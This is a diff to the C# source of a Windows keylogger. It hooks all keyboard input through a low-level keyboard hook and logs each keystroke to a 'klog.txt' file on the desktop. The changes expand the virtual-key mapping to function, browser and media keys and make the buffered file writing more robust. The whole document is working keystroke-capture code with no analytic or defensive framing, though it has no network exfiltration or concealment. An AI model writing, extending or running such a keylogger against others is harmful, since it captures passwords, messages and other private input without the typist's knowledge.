@@ -8,365 +8,469 @@ public class Program
     private static UnhookWindowsHookExSafeHandle? _kbHook;
     private static readonly string PathToFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "klog.txt");
     private static readonly List<string> Buffer = new();
-    private static readonly StreamWriter Writer = new(PathToFile);
+    private static StreamWriter _writer = new(PathToFile);
     private const uint BufferSize = 10;
 
     public static unsafe void Main()
     {
         _kbHook = PInvoke.SetWindowsHookEx(
             WINDOWS_HOOK_ID.WH_KEYBOARD_LL, KeyboardCallback, null, 0);
+        
         MSG msg = new();
         while (PInvoke.GetMessage(&msg, new HWND(), 0, 0))
         {
             PInvoke.TranslateMessage(msg);
             PInvoke.DispatchMessage(msg);
         }
+        
         _kbHook.Close();
-        Writer.Dispose();
+        _writer.Flush();
+        _writer.Dispose();
     }
 
     private static unsafe LRESULT KeyboardCallback(int code, WPARAM wParam, LPARAM lParam)
     {
         var kbStruct = (KBDLLHOOKSTRUCT*) lParam.Value.ToPointer();
+        
         if (code != 0 || (wParam != 0x0100 && wParam != 0x0104))
             return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
+
+        string stringToWrite;
+        // https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
+        // maps most of the virtual key codes to human-readable strings. some that are missing are clearly marked with
+        // their code
         switch (kbStruct->vkCode)
         {
             case 0x08:
-                WriteToFile(" [BACKSPACE] ");
+                stringToWrite = " [BACKSPACE] ";
                 break;
             case 0x09:
-                WriteToFile(" [TAB] ");
+                stringToWrite = " [TAB] ";
                 break;
             case 0x0C:
-                WriteToFile(" [CLEAR] ");
+                stringToWrite = " [CLEAR] ";
                 break;
             case 0x0D:
-                WriteToFile(" [ENTER] ");
+                stringToWrite = " [ENTER] ";
                 break;
             case 0x10:
-                WriteToFile(" [SHIFT] ");
+                stringToWrite = " [SHIFT] ";
                 break;
             case 0x11:
-                WriteToFile(" [CTRL] ");
+                stringToWrite = " [CTRL] ";
                 break;
             case 0x12:
-                WriteToFile(" [ALT] ");
+                stringToWrite = " [ALT] ";
                 break;
             case 0x13:
-                WriteToFile(" [PAUSE] ");
+                stringToWrite = " [PAUSE] ";
                 break;
             case 0x14:
-                WriteToFile(" [CAPS LOCK] ");
+                stringToWrite = " [CAPS LOCK] ";
                 break;
             case 0x15:
-                WriteToFile(" [IME Kana/Hangul mode] ");
+                stringToWrite = " [IME Kana/Hangul mode] ";
                 break;
             case 0x17:
-                WriteToFile(" [IME On] ");
+                stringToWrite = " [IME On] ";
                 break;
             case 0x18:
-                WriteToFile(" [IME final mode] ");
+                stringToWrite = " [IME final mode] ";
                 break;
             case 0x19:
-                WriteToFile(" [IME Hanja/Kanji mode] ");
+                stringToWrite = " [IME Hanja/Kanji mode] ";
                 break;
             case 0x1A:
-                WriteToFile(" [IME Off] ");
+                stringToWrite = " [IME Off] ";
                 break;
             case 0x1B:
-                WriteToFile(" [ESCAPE] ");
+                stringToWrite = " [ESCAPE] ";
                 break;
             case 0x1C:
-                WriteToFile(" [IME convert] ");
+                stringToWrite = " [IME convert] ";
                 break;
             case 0x1D:
-                WriteToFile(" [IME nonconvert] ");
+                stringToWrite = " [IME nonconvert] ";
                 break;
             case 0x1E:
-                WriteToFile(" [IME accept] ");
+                stringToWrite = " [IME accept] ";
                 break;
             case 0x1F:
-                WriteToFile(" [IME mode change request] ");
+                stringToWrite = " [IME mode change request] ";
                 break;
             case 0x20:
-                WriteToFile(" [SPACE] ");
+                stringToWrite = " [SPACE] ";
                 break;
             case 0x21:
-                WriteToFile(" [PAGE UP] ");
+                stringToWrite = " [PAGE UP] ";
                 break;
             case 0x22:
-                WriteToFile(" [PAGE DOWN] ");
+                stringToWrite = " [PAGE DOWN] ";
                 break;
             case 0x23:
-                WriteToFile(" [END] ");
+                stringToWrite = " [END] ";
                 break;
             case 0x24:
-                WriteToFile(" [HOME] ");
+                stringToWrite = " [HOME] ";
                 break;
             case 0x25:
-                WriteToFile(" [LEFT ARROW] ");
+                stringToWrite = " [LEFT ARROW] ";
                 break;
             case 0x26:
-                WriteToFile(" [UP ARROW] ");
+                stringToWrite = " [UP ARROW] ";
                 break;
             case 0x27:
-                WriteToFile(" [RIGHT ARROW] ");
+                stringToWrite = " [RIGHT ARROW] ";
                 break;
             case 0x28:
-                WriteToFile(" [DOWN ARROW] ");
+                stringToWrite = " [DOWN ARROW] ";
                 break;
             case 0x29:
-                WriteToFile(" [SELECT] ");
+                stringToWrite = " [SELECT] ";
                 break;
             case 0x2A:
-                WriteToFile(" [PRINT] ");
+                stringToWrite = " [PRINT] ";
                 break;
             case 0x2B:
-                WriteToFile(" [EXECUTE] ");
+                stringToWrite = " [EXECUTE] ";
                 break;
             case 0x2C:
-                WriteToFile(" [PRINT SCREEN] ");
+                stringToWrite = " [PRINT SCREEN] ";
                 break;
             case 0x2D:
-                WriteToFile(" [INSERT] ");
+                stringToWrite = " [INSERT] ";
                 break;
             case 0x2E:
-                WriteToFile(" [DELETE] ");
+                stringToWrite = " [DELETE] ";
                 break;
             case 0x2F:
-                WriteToFile(" [HELP] ");
+                stringToWrite = " [HELP] ";
                 break;
             case 0x30:
-                WriteToFile("0");
+                stringToWrite = "0";
                 break;
             case 0x31:
-                WriteToFile("1");
+                stringToWrite = "1";
                 break;
             case 0x32:
-                WriteToFile("2");
+                stringToWrite = "2";
                 break;
             case 0x33:
-                WriteToFile("3");
+                stringToWrite = "3";
                 break;
             case 0x34:
-                WriteToFile("4");
+                stringToWrite = "4";
                 break;
             case 0x35:
-                WriteToFile("5");
+                stringToWrite = "5";
                 break;
             case 0x36:
-                WriteToFile("6");
+                stringToWrite = "6";
                 break;
             case 0x37:
-                WriteToFile("7");
+                stringToWrite = "7";
                 break;
             case 0x38:
-                WriteToFile("8");
+                stringToWrite = "8";
                 break;
             case 0x39:
-                WriteToFile("9");
+                stringToWrite = "9";
                 break;
             case 0x41:
-                WriteToFile("A");
+                stringToWrite = "A";
                 break;
             case 0x42:
-                WriteToFile("B");
+                stringToWrite = "B";
                 break;
             case 0x43:
-                WriteToFile("C");
+                stringToWrite = "C";
                 break;
             case 0x44:
-                WriteToFile("D");
+                stringToWrite = "D";
                 break;
             case 0x45:
-                WriteToFile("E");
+                stringToWrite = "E";
                 break;
             case 0x46:
-                WriteToFile("F");
+                stringToWrite = "F";
                 break;
             case 0x47:
-                WriteToFile("G");
+                stringToWrite = "G";
                 break;
             case 0x48:
-                WriteToFile("H");
+                stringToWrite = "H";
                 break;
             case 0x49:
-                WriteToFile("I");
+                stringToWrite = "I";
                 break;
             case 0x4A:
-                WriteToFile("J");
+                stringToWrite = "J";
                 break;
             case 0x4B:
-                WriteToFile("K");
+                stringToWrite = "K";
                 break;
             case 0x4C:
-                WriteToFile("L");
+                stringToWrite = "L";
                 break;
             case 0x4D:
-                WriteToFile("M");
+                stringToWrite = "M";
                 break;
             case 0x4E:
-                WriteToFile("N");
+                stringToWrite = "N";
                 break;
             case 0x4F:
-                WriteToFile("O");
+                stringToWrite = "O";
                 break;
             case 0x50:
-                WriteToFile("P");
+                stringToWrite = "P";
                 break;
             case 0x51:
-                WriteToFile("Q");
+                stringToWrite = "Q";
                 break;
             case 0x52:
-                WriteToFile("R");
+                stringToWrite = "R";
                 break;
             case 0x53:
-                WriteToFile("S");
+                stringToWrite = "S";
                 break;
             case 0x54:
-                WriteToFile("T");
+                stringToWrite = "T";
                 break;
             case 0x55:
-                WriteToFile("U");
+                stringToWrite = "U";
                 break;
             case 0x56:
-                WriteToFile("V");
+                stringToWrite = "V";
                 break;
             case 0x57:
-                WriteToFile("W");
+                stringToWrite = "W";
                 break;
             case 0x58:
-                WriteToFile("X");
+                stringToWrite = "X";
                 break;
             case 0x59:
-                WriteToFile("Y");
+                stringToWrite = "Y";
                 break;
             case 0x5A:
-                WriteToFile("Z");
+                stringToWrite = "Z";
                 break;
             case 0x5B:
-                WriteToFile(" [LEFT WINDOWS KEY] ");
+                stringToWrite = " [LEFT WINDOWS KEY] ";
                 break;
             case 0x5C:
-                WriteToFile(" [RIGHT WINDOWS KEY] ");
+                stringToWrite = " [RIGHT WINDOWS KEY] ";
                 break;
             case 0x5D:
-                WriteToFile(" [APPLICATIONS KEY] ");
+                stringToWrite = " [APPLICATIONS KEY] ";
                 break;
             case 0x5F:
-                WriteToFile(" [SLEEP] ");
+                stringToWrite = " [SLEEP] ";
                 break;
             case 0x60:
-                WriteToFile("[NUMPAD 0]");
+                stringToWrite = "[NUMPAD 0]";
                 break;
             case 0x61:
-                WriteToFile("[NUMPAD 1]");
+                stringToWrite = "[NUMPAD 1]";
                 break;
             case 0x62:
-                WriteToFile("[NUMPAD 2]");
+                stringToWrite = "[NUMPAD 2]";
                 break;
             case 0x63:
-                WriteToFile("[NUMPAD 3]");
+                stringToWrite = "[NUMPAD 3]";
                 break;
             case 0x64:
-                WriteToFile("[NUMPAD 4]");
+                stringToWrite = "[NUMPAD 4]";
                 break;
             case 0x65:
-                WriteToFile("[NUMPAD 5]");
+                stringToWrite = "[NUMPAD 5]";
                 break;
             case 0x66:
-                WriteToFile("[NUMPAD 6]");
+                stringToWrite = "[NUMPAD 6]";
                 break;
             case 0x67:
-                WriteToFile("[NUMPAD 7]");
+                stringToWrite = "[NUMPAD 7]";
                 break;
             case 0x68:
-                WriteToFile("[NUMPAD 8]");
+                stringToWrite = "[NUMPAD 8]";
                 break;
             case 0x69:
-                WriteToFile("[NUMPAD 9]");
+                stringToWrite = "[NUMPAD 9]";
                 break;
             case 0x6A:
-                WriteToFile(" [MULTIPLY] ");
+                stringToWrite = " [MULTIPLY] ";
                 break;
             case 0x6B:
-                WriteToFile(" [ADD] ");
+                stringToWrite = " [ADD] ";
                 break;
             case 0x6C:
-                WriteToFile(" [SEPARATOR] ");
+                stringToWrite = " [SEPARATOR] ";
                 break;
             case 0x6D:
-                WriteToFile(" [SUBTRACT] ");
+                stringToWrite = " [SUBTRACT] ";
                 break;
             case 0x6E:
-                WriteToFile(" [DECIMAL] ");
+                stringToWrite = " [DECIMAL] ";
                 break;
             case 0x6F:
-                WriteToFile(" [DIVIDE] ");
+                stringToWrite = " [DIVIDE] ";
                 break;
             case 0x70:
-                WriteToFile(" [F1] ");
+                stringToWrite = " [F1] ";
                 break;
             case 0x71:
-                WriteToFile(" [F2] ");
+                stringToWrite = " [F2] ";
                 break;
             case 0x72:
-                WriteToFile(" [F3] ");
+                stringToWrite = " [F3] ";
                 break;
             case 0x73:
-                WriteToFile(" [F4] ");
+                stringToWrite = " [F4] ";
                 break;
             case 0x74:
-                WriteToFile(" [F5] ");
+                stringToWrite = " [F5] ";
                 break;
             case 0x75:
-                WriteToFile(" [F6] ");
+                stringToWrite = " [F6] ";
                 break;
             case 0x76:
-                WriteToFile(" [F7] ");
+                stringToWrite = " [F7] ";
                 break;
             case 0x77:
-                WriteToFile(" [F8] ");
+                stringToWrite = " [F8] ";
                 break;
             case 0x78:
-                WriteToFile(" [F9] ");
+                stringToWrite = " [F9] ";
                 break;
             case 0x79:
-                WriteToFile(" [F10] ");
+                stringToWrite = " [F10] ";
                 break;
             case 0x7A:
-                WriteToFile(" [F11] ");
+                stringToWrite = " [F11] ";
                 break;
             case 0x7B:
-                WriteToFile(" [F12] ");
+                stringToWrite = " [F12] ";
+                break;
+            case 0x7C:
+                stringToWrite = " [F13] ";
+                break;
+            case 0x7D:
+                stringToWrite = " [F14] ";
+                break;
+            case 0x7E:
+                stringToWrite = " [F15] ";
+                break;
+            case 0x7F:
+                stringToWrite = " [F16] ";
+                break;
+            case 0x80:
+                stringToWrite = " [F17] ";
+                break;
+            case 0x81:
+                stringToWrite = " [F18] ";
+                break;
+            case 0x82:
+                stringToWrite = " [F19] ";
+                break;
+            case 0x83:
+                stringToWrite = " [F20] ";
+                break;
+            case 0x84:
+                stringToWrite = " [F21] ";
+                break;
+            case 0x85:
+                stringToWrite = " [F22] ";
+                break;
+            case 0x86:
+                stringToWrite = " [F23] ";
+                break;
+            case 0x87:
+                stringToWrite = " [F24] ";
                 break;
             case 0x90:
-                WriteToFile(" [NUM LOCK] ");
+                stringToWrite = " [NUM LOCK] ";
                 break;
             case 0x91:
-                WriteToFile(" [SCROLL LOCK] ");
+                stringToWrite = " [SCROLL LOCK] ";
                 break;
             case 0xA0:
-                WriteToFile(" [LEFT SHIFT] ");
+                stringToWrite = " [LEFT SHIFT] ";
                 break;
             case 0xA1:
-                WriteToFile(" [RIGHT SHIFT] ");
+                stringToWrite = " [RIGHT SHIFT] ";
                 break;
             case 0xA2:
-                WriteToFile(" [LEFT CONTROL] ");
+                stringToWrite = " [LEFT CONTROL] ";
                 break;
             case 0xA3:
-                WriteToFile(" [RIGHT CONTROL] ");
+                stringToWrite = " [RIGHT CONTROL] ";
                 break;
             case 0xA4:
-                WriteToFile(" [LEFT ALT] ");
+                stringToWrite = " [LEFT ALT] ";
                 break;
-            // TODO: add missing keys
+            case 0xA5:
+                stringToWrite = " [RIGHT ALT] ";
+                break;
+            case 0xA6:
+                stringToWrite = " [BROWSER BACK] ";
+                break;
+            case 0xA7:
+                stringToWrite = " [BROWSER FORWARD] ";
+                break;
+            case 0xA8:
+                stringToWrite = " [BROWSER REFRESH] ";
+                break;
+            case 0xA9:
+                stringToWrite = " [BROWSER STOP] ";
+                break;
+            case 0xAA:
+                stringToWrite = " [BROWSER SEARCH] ";
+                break;
+            case 0xAB:
+                stringToWrite = " [BROWSER FAVOURITES] ";
+                break;
+            case 0xAC:
+                stringToWrite = " [BROWSER START/HOME] ";
+                break;
+            case 0xAD:
+                stringToWrite = " [VOLUME MUTE] ";
+                break;
+            case 0xAE:
+                stringToWrite = " [VOLUME DOWN] ";
+                break;
+            case 0xAF:
+                stringToWrite = " [VOLUME UP] ";
+                break;
+            case 0xB0:
+                stringToWrite = " [NEXT TRACK] ";
+                break;
+            case 0xB1:
+                stringToWrite = " [PREVIOUS TRACK] ";
+                break;
+            case 0xB2:
+                stringToWrite = " [STOP MEDIA] ";
+                break;
+            case 0xB3:
+                stringToWrite = " [PLAY/PAUSE MEDIA] ";
+                break;
+            case 0xB4:
+                stringToWrite = " [START MAIL] ";
+                break;
+            case 0xB5:
+                stringToWrite = " [SELECT MEDIA] ";
+                break;
+            case 0xB6:
+                stringToWrite = " [START APPLICATION 1] ";
+                break;
+            case 0xB7:
+                stringToWrite = " [START APPLICATION 2] ";
+                break;
             default:
-                WriteToFile(kbStruct->vkCode.ToString());
+                stringToWrite = $"[CODE {kbStruct->vkCode.ToString()}]";
                 break;
         }
+
+        WriteToFile(stringToWrite);
+        
         return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
     }
 
@@ -374,8 +478,23 @@ public class Program
     {
         if (Buffer.Count >= BufferSize)
         {
-            await WriteBuffer();
-            await Writer.FlushAsync();
+            try
+            {
+                await WriteBuffer();
+                await _writer.FlushAsync();
+            }
+            catch (ObjectDisposedException)
+            {
+                _writer = new StreamWriter(PathToFile);
+                await WriteBuffer();
+                await _writer.FlushAsync();
+            }
+            catch (InvalidOperationException)
+            {
+                Thread.Sleep(1000);
+                await WriteBuffer();
+                await _writer.FlushAsync();
+            }
         }
         Buffer.Add(stringToWrite);
     }
@@ -384,8 +503,7 @@ public class Program
     {
         foreach (var str in Buffer)
         {
-            // TODO error handling
-            await Writer.WriteAsync(str);
+            await _writer.WriteAsync(str);
         }
         Buffer.Clear();
     }
